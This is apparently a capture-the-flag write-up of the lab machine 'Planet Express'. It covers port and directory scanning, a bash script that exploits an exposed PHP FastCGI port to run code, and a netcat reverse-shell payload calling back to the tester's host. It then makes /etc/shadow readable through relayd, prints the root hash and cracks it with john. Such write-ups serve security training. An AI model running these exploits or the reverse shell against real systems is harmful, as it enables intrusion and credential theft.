---
layout: post
category: writeup
---

## Machine Info

- Name: Planet Express
- Description: What planet is this from?
- Difficulty: Easy

## Initial Access

Nmap:
```bash
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
|_http-title: PlanetExpress - Coming Soon !
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)
|_http-generator: Pico CMS
9000/tcp open  cslistener?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
offsec dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -e php,txt,html -f -u  http://192.168.166.205/        

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, txt, html | HTTP method: GET | Threads: 64 | Wordlist size: 1102725

Output File: /home/kali/.dirsearch/reports/192.168.166.205/-_24-01-27_16-30-32.txt

Error Log: /home/kali/.dirsearch/logs/errors-24-01-27_16-30-32.log

Target: http://192.168.166.205/

[16:30:33] Starting: 
[16:30:33] 200 -    5KB - /index.php                                       
[16:30:33] 403 -  280B  - /content/                                        
[16:30:34] 301 -  320B  - /content  ->  http://192.168.166.205/content/    
[16:30:34] 403 -  280B  - /icons/                                          
[16:30:34] 403 -  280B  - /themes/                                         
[16:30:34] 301 -  319B  - /themes  ->  http://192.168.166.205/themes/      
[16:30:35] 301 -  319B  - /assets  ->  http://192.168.166.205/assets/      
[16:30:35] 403 -  280B  - /assets/                                         
[16:30:37] 301 -  320B  - /plugins  ->  http://192.168.166.205/plugins/    
[16:30:37] 403 -  280B  - /plugins/                                        
[16:30:45] 403 -  280B  - /vendor/                                         
[16:30:45] 301 -  319B  - /vendor  ->  http://192.168.166.205/vendor/      
[16:30:45] 301 -  319B  - /config  ->  http://192.168.166.205/config/      
[16:30:45] 403 -  280B  - /config/
```

Dirsearch found nothing too valuable, I'll take shot in the dark with the quick-hits wordlist:

```bash
dirsearch -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -t 64 -u  http://192.168.166.205/config 

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 64 | Wordlist size: 2563

Output File: /home/kali/.dirsearch/reports/192.168.166.205/-config_24-01-27_16-34-27.txt

Error Log: /home/kali/.dirsearch/logs/errors-24-01-27_16-34-27.log

Target: http://192.168.166.205/config/

[16:34:27] Starting: 
[16:34:27] 403 -  280B  - /config/.ht_wsr.txt                              
[16:34:27] 403 -  280B  - /config/.htaccess.bak1
[16:34:27] 403 -  280B  - /config/.htaccess.save
[16:34:27] 403 -  280B  - /config/.htaccess.orig
[16:34:27] 403 -  280B  - /config/.htaccess.sample
[16:34:27] 403 -  280B  - /config/.htaccess_orig
[16:34:27] 403 -  280B  - /config/.htaccessOLD2
[16:34:27] 403 -  280B  - /config/.htaccess_sc
[16:34:27] 403 -  280B  - /config/.htaccessOLD
[16:34:27] 403 -  280B  - /config/.htpasswds
[16:34:27] 403 -  280B  - /config/.htpasswd_test                           
[16:34:27] 200 -   33B  - /config/.gitignore
[16:34:28] 403 -  280B  - /config/.htaccess_extra                           
[16:34:28] 403 -  280B  - /config/.htaccessBAK
[16:34:29] 200 -  812B  - /config/config.yml                                
```

I find config.yml!

```bash
offsec cat config.yml 
##
# Basic
#
site_title: PlanetExpress
base_url: ~

rewrite_url: ~
debug: true
timezone: ~
locale: ~

##
# Theme
#
theme: launch
themes_url: ~

theme_config:
    widescreen: false
twig_config:
    autoescape: html
    strict_variables: false
    charset: utf-8
    debug: ~
    cache: false
    auto_reload: true

##
# Content
#
date_format: %D %T
pages_order_by_meta: planetexpress 

pages_order_by: alpha
pages_order: asc
content_dir: ~
content_ext: .md
content_config:
    extra: true
    breaks: false
    escape: false
    auto_urls: true
assets_dir: assets/
assets_url: ~

##
# Plugins: https://github.com/picocms/Pico/tree/master/plugins
#
plugins_url: ~
DummyPlugin.enabled: false

PicoOutput:
  formats: [content, raw, json]

## 
# Self developed plugin for PlanetExpress
#
#PicoTest:
#  enabled: true
```

Checking the custom plugin at the bottom:

![](assets/images/2024-01-27-OFFSEC-planetexpress-writeup-image-1.png)

Now we know of the existance of a ph script, now we can try to exploit fastcgi in order to get a shell:

```bash
#!/bin/bash

PAYLOAD="<?php echo '<!--'; system('whoami'); echo '-->';"
FILENAMES="/var/www/html/index.php" # Exisiting file path

HOST=$1
B64=$(echo "$PAYLOAD"|base64)

for FN in $FILENAMES; do
    OUTPUT=$(mktemp)
    env -i \
      PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \
      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
      cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT

    cat $OUTPUT
done
```

![](assets/images/2024-01-27-OFFSEC-planetexpress-writeup-image-2.png)

so with this information I will change the script up and change system to passthru and the path to the full path of our test script:

![](assets/images/2024-01-27-OFFSEC-planetexpress-writeup-image-3.png)

Now I'll change the payload to a rev shell:

```bash
#!/bin/bash

PAYLOAD="<?php echo '<!--'; passthru('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.222 80 >/tmp/f '); echo '-->';"
FILENAMES="/var/www/html/planetexpress/plugins/PicoTest.php" # Exisiting file path

HOST=$1
B64=$(echo "$PAYLOAD"|base64)

for FN in $FILENAMES; do
    OUTPUT=$(mktemp)
    env -i \
      PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \
      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
      cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT

    cat $OUTPUT
done
```

## Privilege Escalation

```bash
www-data@planetexpress:~/html/planetexpress/plugins$ ls -l /etc/passwd   
-rw-r--r-- 1 root root 1385 Jan 10  2022 /etc/passwd
www-data@planetexpress:~/html/planetexpress/plugins$ ls -l /etc/shadow
-rw-r----- 1 root shadow 940 Jan 10  2022 /etc/shadow
www-data@planetexpress:~/html/planetexpress/plugins$ /usr/sbin/relayd -C /etc/shadow
[ERR] 2022-12-06 12:10:29 config.cpp:1539 write
[ERR] 2022-12-06 12:10:29 config.cpp:1213 open failed [/usr/etc/relayd/misc.conf.tmp.12217]
[ERR] 2022-12-06 12:10:29 config.cpp:1189 bad json format [/etc/shadow]
www-data@planetexpress:~/html/planetexpress/plugins$ ls -l /etc/shadow
-rw-r--r-- 1 root shadow 940 Jan 10  2022 /etc/shadow
www-data@planetexpress:~/html/planetexpress/plugins$ cat /etc/shadow
root:$6$vkAzDkveIBc6PmO1$y8QyGSMqJEUxsDfdsX3nL5GsW7p/1mn5pmfz66RBn.jd7gONn0vC3xf8ga33/Fq57xMuqMquhB9MoTRpTTHVO1:19003:0:99999:7:::
```

Now I crack that hash with john:

```bash
offsec john -w=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
neverwant2saygoodbye (?)     
1g 0:00:01:46 DONE (2024-01-27 17:03) 0.009414g/s 7929p/s 7929c/s 7929C/s newme11..nesbits
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

```bash
root@planetexpress:~# id
uid=0(root) gid=0(root) groups=0(root)
```

best,
gerbsec